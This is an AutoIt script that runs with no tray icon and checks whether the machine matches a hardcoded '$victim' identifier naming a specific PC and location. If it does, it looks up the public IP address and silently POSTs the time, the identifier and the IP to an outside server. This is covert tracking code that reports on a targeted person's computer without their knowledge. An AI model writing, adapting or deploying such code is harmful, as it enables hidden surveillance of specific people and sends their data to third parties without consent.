#include <Date.au3>
  
#NoTrayIcon

Local $victim = "pc Thanh Nghia, Ninh Son, Tay Ninh"

Local $tCur = _Date_Time_GetSystemTime()

Local $sFilePath = @WindowsDir & "\desktopbg\test.txt"

$file = FileOpen($sFilePath, 0)
$gameRomName = FileRead($file)
FileClose($file)



; #INTERNAL_USE_ONLY# ===========================================================================================================
; Name ..........: __NOIP_GetIpAddress
; Description ...: Retrive the current IP address
; Syntax ........: __NOIP_GetIpAddress()
;Return values .:  On Success - Returns string containing IP address corresponding to the name.
;				   On Failure -
;							    @error = 1 Unable to contact the server
;							    @error = 2 Unable to retrive the IP address
; Author ........: Nessie
; Example .......: __NOIP_GetIpAddress()
; ===============================================================================================================================
Func __NOIP_GetIpAddress()
	Local $bRead, $sRead, $aResult
	$bRead = InetRead("http://checkip.dyndns.org")
	If @error Then Return SetError(1, 0, "")
	$sRead = BinaryToString($bRead)
	If @error Then Return SetError(2, 0, "")

	$aResult = StringRegExp($sRead, "(?s)(?i)<body>Current IP Address: (.*?)</body>", 3)
	If Not @error Then Return $aResult[0]

	Return $bRead
EndFunc   ;==>__NOIP_GetIpAddress

if $gameRomName == $victim then

Local Static $sHostIP = __NOIP_GetIpAddress()


; The data to be sent
local $sPD = 'time='&_Date_Time_SystemTimeToDateTimeStr($tCur)&'&gamerom='&$gameRomName&'&ip='&$sHostIP


; Creating the object
$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
$oHTTP.Open("POST", "http://chuphong.net/pm/save.php", False)
$oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")

; Performing the Request
$oHTTP.Send($sPD)

; Download the body response if any, and get the server status response code.
;$oReceived = $oHTTP.ResponseText
;$oStatusCode = $oHTTP.Status
endif